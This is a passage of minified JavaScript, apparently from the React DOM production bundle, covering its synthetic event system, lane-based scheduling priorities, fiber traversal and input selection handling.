typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Pc=null;function Gd(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Dc=null,fs=null,hs=null;function Ap(t){if(t=co(t)){if(typeof Dc!="function")throw Error(O(280));var e=t.stateNode;e&&(e=nl(e),Dc(t.stateNode,t.type,e))}}function om(t){fs?hs?hs.push(t):hs=[t]:fs=t}function am(){if(fs){var t=fs,e=hs;if(hs=fs=null,Ap(t),e)for(t=0;t<e.length;t++)Ap(e[t])}}function lm(t,e){return t(e)}function cm(){}var Ml=!1;function dm(t,e,n){if(Ml)return t(e,n);Ml=!0;try{return lm(t,e,n)}finally{Ml=!1,(fs!==null||hs!==null)&&(cm(),am())}}function Ai(t,e){var n=t.stateNode;if(n===null)return null;var r=nl(n);if(r===null)return null;n=r[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(t=t.type,r=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!r;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(O(231,e,typeof n));return n}var Lc=!1;if(Rn)try{var ei={};Object.defineProperty(ei,"passive",{get:function(){Lc=!0}}),window.addEventListener("test",ei,ei),window.removeEventListener("test",ei,ei)}catch{Lc=!1}function P0(t,e,n,r,s,o,a,l,c){var d=Array.prototype.slice.call(arguments,3);try{e.apply(n,d)}catch(p){this.onError(p)}}var xi=!1,ca=null,da=!1,zc=null,D0={onError:function(t){xi=!0,ca=t}};function L0(t,e,n,r,s,o,a,l,c){xi=!1,ca=null,P0.apply(D0,arguments)}function z0(t,e,n,r,s,o,a,l,c){if(L0.apply(this,arguments),xi){if(xi){var d=ca;xi=!1,ca=null}else throw Error(O(198));da||(da=!0,zc=d)}}function Wr(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function um(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function Pp(t){if(Wr(t)!==t)throw Error(O(188))}function M0(t){var e=t.alternate;if(!e){if(e=Wr(t),e===null)throw Error(O(188));return e!==t?null:t}for(var n=t,r=e;;){var s=n.return;if(s===null)break;var o=s.alternate;if(o===null){if(r=s.return,r!==null){n=r;continue}break}if(s.child===o.child){for(o=s.child;o;){if(o===n)return Pp(s),t;if(o===r)return Pp(s),e;o=o.sibling}throw Error(O(188))}if(n.return!==r.return)n=s,r=o;else{for(var a=!1,l=s.child;l;){if(l===n){a=!0,n=s,r=o;break}if(l===r){a=!0,r=s,n=o;break}l=l.sibling}if(!a){for(l=o.child;l;){if(l===n){a=!0,n=o,r=s;break}if(l===r){a=!0,r=o,n=s;break}l=l.sibling}if(!a)throw Error(O(189))}}if(n.alternate!==r)throw Error(O(190))}if(n.tag!==3)throw Error(O(188));return n.stateNode.current===n?t:e}function pm(t){return t=M0(t),t!==null?fm(t):null}function fm(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=fm(t);if(e!==null)return e;t=t.sibling}return null}var hm=At.unstable_scheduleCallback,Dp=At.unstable_cancelCallback,O0=At.unstable_shouldYield,F0=At.unstable_requestPaint,ze=At.unstable_now,W0=At.unstable_getCurrentPriorityLevel,Yd=At.unstable_ImmediatePriority,mm=At.unstable_UserBlockingPriority,ua=At.unstable_NormalPriority,$0=At.unstable_LowPriority,gm=At.unstable_IdlePriority,Ja=null,fn=null;function B0(t){if(fn&&typeof fn.onCommitFiberRoot=="function")try{fn.onCommitFiberRoot(Ja,t,void 0,(t.current.flags&128)===128)}catch{}}var tn=Math.clz32?Math.clz32:V0,U0=Math.log,H0=Math.LN2;function V0(t){return t>>>=0,t===0?32:31-(U0(t)/H0|0)|0}var To=64,Ao=4194304;function hi(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function pa(t,e){var n=t.pendingLanes;if(n===0)return 0;var r=0,s=t.suspendedLanes,o=t.pingedLanes,a=n&268435455;if(a!==0){var l=a&~s;l!==0?r=hi(l):(o&=a,o!==0&&(r=hi(o)))}else a=n&~s,a!==0?r=hi(a):o!==0&&(r=hi(o));if(r===0)return 0;if(e!==0&&e!==r&&!(e&s)&&(s=r&-r,o=e&-e,s>=o||s===16&&(o&4194240)!==0))return e;if(r&4&&(r|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=r;0<e;)n=31-tn(e),s=1<<n,r|=t[n],e&=~s;return r}function G0(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Y0(t,e){for(var n=t.suspendedLanes,r=t.pingedLanes,s=t.expirationTimes,o=t.pendingLanes;0<o;){var a=31-tn(o),l=1<<a,c=s[a];c===-1?(!(l&n)||l&r)&&(s[a]=G0(l,e)):c<=e&&(t.expiredLanes|=l),o&=~l}}function Mc(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function xm(){var t=To;return To<<=1,!(To&4194240)&&(To=64),t}function Ol(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function ao(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-tn(e),t[e]=n}function K0(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var r=t.eventTimes;for(t=t.expirationTimes;0<n;){var s=31-tn(n),o=1<<s;e[s]=0,r[s]=-1,t[s]=-1,n&=~o}}function Kd(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var r=31-tn(n),s=1<<r;s&e|t[r]&e&&(t[r]|=e),n&=~s}}var pe=0;function vm(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var ym,Qd,bm,_m,wm,Oc=!1,Po=[],Qn=null,qn=null,Xn=null,Pi=new Map,Di=new Map,Hn=[],Q0="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Lp(t,e){switch(t){case"focusin":case"focusout":Qn=null;break;case"dragenter":case"dragleave":qn=null;break;case"mouseover":case"mouseout":Xn=null;break;case"pointerover":case"pointerout":Pi.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":Di.delete(e.pointerId)}}function ti(t,e,n,r,s,o){return t===null||t.nativeEvent!==o?(t={blockedOn:e,domEventName:n,eventSystemFlags:r,nativeEvent:o,targetContainers:[s]},e!==null&&(e=co(e),e!==null&&Qd(e)),t):(t.eventSystemFlags|=r,e=t.targetContainers,s!==null&&e.indexOf(s)===-1&&e.push(s),t)}function q0(t,e,n,r,s){switch(e){case"focusin":return Qn=ti(Qn,t,e,n,r,s),!0;case"dragenter":return qn=ti(qn,t,e,n,r,s),!0;case"mouseover":return Xn=ti(Xn,t,e,n,r,s),!0;case"pointerover":var o=s.pointerId;return Pi.set(o,ti(Pi.get(o)||null,t,e,n,r,s)),!0;case"gotpointercapture":return o=s.pointerId,Di.set(o,ti(Di.get(o)||null,t,e,n,r,s)),!0}return!1}function Sm(t){var e=jr(t.target);if(e!==null){var n=Wr(e);if(n!==null){if(e=n.tag,e===13){if(e=um(n),e!==null){t.blockedOn=e,wm(t.priority,function(){bm(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Qo(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=Fc(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var r=new n.constructor(n.type,n);Pc=r,n.target.dispatchEvent(r),Pc=null}else return e=co(n),e!==null&&Qd(e),t.blockedOn=n,!1;e.shift()}return!0}function zp(t,e,n){Qo(t)&&n.delete(e)}function X0(){Oc=!1,Qn!==null&&Qo(Qn)&&(Qn=null),qn!==null&&Qo(qn)&&(qn=null),Xn!==null&&Qo(Xn)&&(Xn=null),Pi.forEach(zp),Di.forEach(zp)}function ni(t,e){t.blockedOn===e&&(t.blockedOn=null,Oc||(Oc=!0,At.unstable_scheduleCallback(At.unstable_NormalPriority,X0)))}function Li(t){function e(s){return ni(s,t)}if(0<Po.length){ni(Po[0],t);for(var n=1;n<Po.length;n++){var r=Po[n];r.blockedOn===t&&(r.blockedOn=null)}}for(Qn!==null&&ni(Qn,t),qn!==null&&ni(qn,t),Xn!==null&&ni(Xn,t),Pi.forEach(e),Di.forEach(e),n=0;n<Hn.length;n++)r=Hn[n],r.blockedOn===t&&(r.blockedOn=null);for(;0<Hn.length&&(n=Hn[0],n.blockedOn===null);)Sm(n),n.blockedOn===null&&Hn.shift()}var ms=Mn.ReactCurrentBatchConfig,fa=!0;function J0(t,e,n,r){var s=pe,o=ms.transition;ms.transition=null;try{pe=1,qd(t,e,n,r)}finally{pe=s,ms.transition=o}}function Z0(t,e,n,r){var s=pe,o=ms.transition;ms.transition=null;try{pe=4,qd(t,e,n,r)}finally{pe=s,ms.transition=o}}function qd(t,e,n,r){if(fa){var s=Fc(t,e,n,r);if(s===null)Kl(t,e,r,ha,n),Lp(t,r);else if(q0(s,t,e,n,r))r.stopPropagation();else if(Lp(t,r),e&4&&-1<Q0.indexOf(t)){for(;s!==null;){var o=co(s);if(o!==null&&ym(o),o=Fc(t,e,n,r),o===null&&Kl(t,e,r,ha,n),o===s)break;s=o}s!==null&&r.stopPropagation()}else Kl(t,e,r,null,n)}}var ha=null;function Fc(t,e,n,r){if(ha=null,t=Gd(r),t=jr(t),t!==null)if(e=Wr(t),e===null)t=null;else if(n=e.tag,n===13){if(t=um(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return ha=t,null}function Cm(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(W0()){case Yd:return 1;case mm:return 4;case ua:case $0:return 16;case gm:return 536870912;default:return 16}default:return 16}}var Gn=null,Xd=null,qo=null;function jm(){if(qo)return qo;var t,e=Xd,n=e.length,r,s="value"in Gn?Gn.value:Gn.textContent,o=s.length;for(t=0;t<n&&e[t]===s[t];t++);var a=n-t;for(r=1;r<=a&&e[n-r]===s[o-r];r++);return qo=s.slice(t,1<r?1-r:void 0)}function Xo(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function Do(){return!0}function Mp(){return!1}function Dt(t){function e(n,r,s,o,a){this._reactName=n,this._targetInst=s,this.type=r,this.nativeEvent=o,this.target=a,this.currentTarget=null;for(var l in t)t.hasOwnProperty(l)&&(n=t[l],this[l]=n?n(o):o[l]);return this.isDefaultPrevented=(o.defaultPrevented!=null?o.defaultPrevented:o.returnValue===!1)?Do:Mp,this.isPropagationStopped=Mp,this}return Ee(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=Do)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=Do)},persist:function(){},isPersistent:Do}),e}var Ls={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Jd=Dt(Ls),lo=Ee({},Ls,{view:0,detail:0}),ey=Dt(lo),Fl,Wl,ri,Za=Ee({},lo,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Zd,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==ri&&(ri&&t.type==="mousemove"?(Fl=t.screenX-ri.screenX,Wl=t.screenY-ri.screenY):Wl=Fl=0,ri=t),Fl)},movementY:function(t){return"movementY"in t?t.movementY:Wl}}),Op=Dt(Za),ty=Ee({},Za,{dataTransfer:0}),ny=Dt(ty),ry=Ee({},lo,{relatedTarget:0}),$l=Dt(ry),sy=Ee({},Ls,{animationName:0,elapsedTime:0,pseudoElement:0}),iy=Dt(sy),oy=Ee({},Ls,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),ay=Dt(oy),ly=Ee({},Ls,{data:0}),Fp=Dt(ly),cy={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},dy={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},uy={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function py(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=uy[t])?!!e[t]:!1}function Zd(){return py}var fy=Ee({},lo,{key:function(t){if(t.key){var e=cy[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=Xo(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?dy[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Zd,charCode:function(t){return t.type==="keypress"?Xo(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Xo(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),hy=Dt(fy),my=Ee({},Za,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Wp=Dt(my),gy=Ee({},lo,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Zd}),xy=Dt(gy),vy=Ee({},Ls,{propertyName:0,elapsedTime:0,pseudoElement:0}),yy=Dt(vy),by=Ee({},Za,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),_y=Dt(by),wy=[9,13,27,32],eu=Rn&&"CompositionEvent"in window,vi=null;Rn&&"documentMode"in document&&(vi=document.documentMode);var Sy=Rn&&"TextEvent"in window&&!vi,km=Rn&&(!eu||vi&&8<vi&&11>=vi),$p=" ",Bp=!1;function Nm(t,e){switch(t){case"keyup":return wy.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Em(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var ts=!1;function Cy(t,e){switch(t){case"compositionend":return Em(e);case"keypress":return e.which!==32?null:(Bp=!0,$p);case"textInput":return t=e.data,t===$p&&Bp?null:t;default:return null}}function jy(t,e){if(ts)return t==="compositionend"||!eu&&Nm(t,e)?(t=jm(),qo=Xd=Gn=null,ts=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return km&&e.locale!=="ko"?null:e.data;default:return null}}var ky={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Up(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!ky[t.type]:e==="textarea"}function Im(t,e,n,r){om(r),e=ma(e,"onChange"),0<e.length&&(n=new Jd("onChange","change",null,n,r),t.push({event:n,listeners:e}))}var yi=null,zi=null;function Ny(t){Wm(t,0)}function el(t){var e=ss(t);if(Zh(e))return t}function Ey(t,e){if(t==="change")return e}var Rm=!1;if(Rn){var Bl;if(Rn){var Ul="oninput"in document;if(!Ul){var Hp=document.createElement("div");Hp.setAttribute("oninput","return;"),Ul=typeof Hp.oninput=="function"}Bl=Ul}else Bl=!1;Rm=Bl&&(!document.documentMode||9<document.documentMode)}function Vp(){yi&&(yi.detachEvent("onpropertychange",Tm),zi=yi=null)}function Tm(t){if(t.propertyName==="value"&&el(zi)){var e=[];Im(e,zi,t,Gd(t)),dm(Ny,e)}}function Iy(t,e,n){t==="focusin"?(Vp(),yi=e,zi=n,yi.attachEvent("onpropertychange",Tm)):t==="focusout"&&Vp()}function Ry(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return el(zi)}function Ty(t,e){if(t==="click")return el(e)}function Ay(t,e){if(t==="input"||t==="change")return el(e)}function Py(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var on=typeof Object.is=="function"?Object.is:Py;function Mi(t,e){if(on(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),r=Object.keys(e);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var s=n[r];if(!_c.call(e,s)||!on(t[s],e[s]))return!1}return!0}function Gp(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function Yp(t,e){var n=Gp(t);t=0;for(var r;n;){if(n.nodeType===3){if(r=t+n.textContent.length,t<=e&&r>=e)return{node:n,offset:e-t};t=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=Gp(n)}}function Am(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?Am(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function Pm(){for(var t=window,e=la();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=la(t.document)}return e}function tu(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function Dy(t){var e=Pm(),n=t.focusedElem,r=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&Am(n.ownerDocument.documentElement,n)){if(r!==null&&tu(n)){if(e=r.start,t=r.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var s=n.textContent.length,o=Math.min(r.start,s);r=r.end===void 0?o:Math.min(r.end,s),!t.extend&&o>r&&(s=r,r=o,o=s),s=Yp(n,o);var a=Yp(n,r);s&&a&&(t.rangeCount!==1||t.anchorNode!==s.node||t.anchorOffset!==s.offset||t.focusNode!==a.node||t.focusOffset!==a.offset)&&(e=e.createRange(),e.setStart(s.node,s.offset),t.removeAllRanges(),o>r?(t.addRange(e),t.extend(a.node,a.offset)):(e.setEnd(a.node,a.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var Ly=Rn&&"documentMode"in document&&11>=document.documentMode,ns=null,Wc=null,bi=null,$c=!1;function Kp(t,e,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;$c||ns==null||ns!==la(r)||(r=ns,"selectionStart"in r&&tu(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),bi&&Mi(bi,r)||(bi=r,r=ma(Wc,"onSelect"),0<r.length&&(e=new Jd("onSelect","select",null,e,n),t.push({event:e,listeners:r}),e.target=ns)))}function Lo(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var rs={animationend:Lo("Animation","AnimationEnd"),animationiteration:Lo("Animation","AnimationIteration"),animationstart:Lo("Animation","AnimationStart"),transitionend:Lo("Transition","TransitionEnd")},Hl={},Dm={};Rn&&(Dm=document.createElement("div").style,"AnimationEvent"in window||(delete rs.animationend.animation,delete rs.animationiteration.animation,delete rs.animationstart.animation),"TransitionEvent"in window||delete rs.transitionend.transition);function tl(t){if(Hl[t])return Hl[t];if(!rs[t])return t;var e=rs[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in Dm)return Hl[t]=e[n];return t}var Lm=tl("animationend"),zm=tl("animationiteration"),Mm=tl("animationstart"),Om=tl("transitionend"),Fm=new Map,Qp="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function pr(t,e){Fm.set(t,e),Fr(e,[t])}for(var Vl=0;Vl<Qp.length;Vl++){var Gl=Qp[Vl],zy=Gl.toLowerCase(),My=Gl[0].toUpperCase()+Gl.slice(1);pr(zy,"on"+My)}pr(Lm,"onAnimationEnd");pr(zm,"onAnimationIteration");pr(Mm,"onAnimationStart");pr("dblclick","onDoubleClick");pr("focusin","onFocus");pr("focusout","onBlur");pr(Om,"onTransitionEnd");_s("onMouseEnter",["mouseout","mouseover"]);_s("onMouseLeave",["mouseout","mouseover"]);_s("onPointerEnter",["pointerout","pointerover"]);_s("onPointerLeave",["pointerout","pointerover"]);Fr("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Fr("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Fr("onBeforeInput",["compositionend","keypress","textInput","paste"]);Fr("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Fr("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Fr("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var mi="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Oy=new Set("cancel close invalid load scroll toggle".split(" ").concat(mi));function qp(t,e,n){var r=t.type||"unknown-event";t.currentTarget=n,z0(r,e,void 0,t),t.currentTarget=null}function Wm(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var r=t[n],s=r.event;r=r.listeners;e:{var o=void 0;if(e)for(var a=r.length-1;0<=a;a--){var l=r[a],c=l.instance,d=l.currentTarget;if(l=l.listener,c!==o&&s.isPropagationStopped())break e;qp(s,l,d),o=c}else for(a=0;a<r.length;a++){if(l=r[a],c=l.instance,d=l.currentTarget,l=l.listener,c!==o&&s.isPropagationStopped())break e;qp(s,l,d),o=c}}}if(da)throw t=zc,da=!1,zc=null,t}function be(t,e){var n=e[Gc];n===void 0&&(n=e[Gc]=new Set);var r=t+"__bubble";n.has(r)||($m(e,t,2,!1),n.add(r))}function Yl(t,e,n){var r=0;e&&(r|=4),$m(n,t,r,e)}var zo="_reactListening"+Math.random().toString(36).slice(2);function Oi(t){if(!t[zo]){t[zo]=!0,Kh.forEach(function(n){n!=="selectionchange"&&(Oy.has(n)||Yl(n,!1,t),Yl(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[zo]||(e[zo]=!0,Yl("selectionchange",!1,e))}}function $m(t,e,n,r){switch(Cm(e)){case 1:var s=J0;break;case 4:s=Z0;break;default:s=qd}n=s.bind(null,e,n,t),s=void 0,!Lc||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(s=!0),r?s!==void 0?t.addEventListener(e,n,{capture:!0,passive:s}):t.addEventListener(e,n,!0):s!==void 0?t.addEventListener(e,n,{passive:s}):t.addEventListener(e,n,!1)}function Kl(t,e,n,r,s){var o=r;if(!(e&1)&&!(e&2)&&r!==null)e:for(;;){if(r===null)return;var a=r.tag;if(a===3||a===4){var l=r.stateNode.containerInfo;if(l===s||l.nodeType===8&&l.parentNode===s)break;if(a===4)for(a=r.return;a!==null;){var c=a.tag;if((c===3||c===4)&&(c=a.stateNode.containerInfo,c===s||c.nodeType===8&&c.parentNode===s))return;a=a.return}for(;l!==null;){if(a=jr(l),a===null)return;if(c=a.tag,c===5||c===6){r=o=a;continue e}l=l.parentNode}}r=r.return}dm(function(){var d=o,p=Gd(n),f=[];e:{var u=Fm.get(t);if(u!==void 0){var b=Jd,x=t;switch(t){case"keypress":if(Xo(n)===0)break e;case"keydown":case"keyup":b=hy;break;case"focusin":x="focus",b=$l;break;case"focusout":x="blur",b=$l;break;case"beforeblur":case"afterblur":b=$l;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":b=Op;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":b=ny;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":b=xy;break;case Lm:case zm:case Mm:b=iy;break;case Om:b=yy;break;case"scroll":b=ey;break;case"wheel":b=_y;break;case"copy":case"cut":case"paste":b=ay;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":b=Wp}var v=(e&4)!==0,_=!v&&t==="scroll",m=v?u!==null?u+"Capture":null:u;v=[];for(var h=d,y;h!==null;){y=h;var w=y.stateNode;if(y.tag===5&&w!==null&&(y=w,m!==null&&(w=Ai(h,m),w!=null&&v.push(Fi(h,w,y)))),_)break;h=h.return}0<v.length&&(u=new b(u,x,null,n,p),f.push({event:u,listeners:v}))}}if(!(e&7)){e:{if(u=t==="mouseover"||t==="pointerover",b=t==="mouseout"||t==="pointerout",u&&n!==Pc&&(x=n.relatedTarget||n.fromElement)&&(jr(x)||x[Tn]))break e;if((b||u)&&(u=p.window===p?p:(u=p.ownerDocument)?u.defaultView||u.parentWindow:window,b?(x=n.relatedTarget||n.toElement,b=d,x=x?jr(x):null,x!==null&&(_=Wr(x),x!==_||x.tag!==5&&x.tag!==6)&&(x=null)):(b=null,x=d),b!==x)){if(v=Op,w="onMouseLeave",m="onMouseEnter",h="mouse",(t==="pointerout"||t==="pointerover")&&(v=Wp,w="onPointerLeave",m="onPointerEnter",h="pointer"),_=b==null?u:ss(b),y=x==null?u:ss(x),u=new 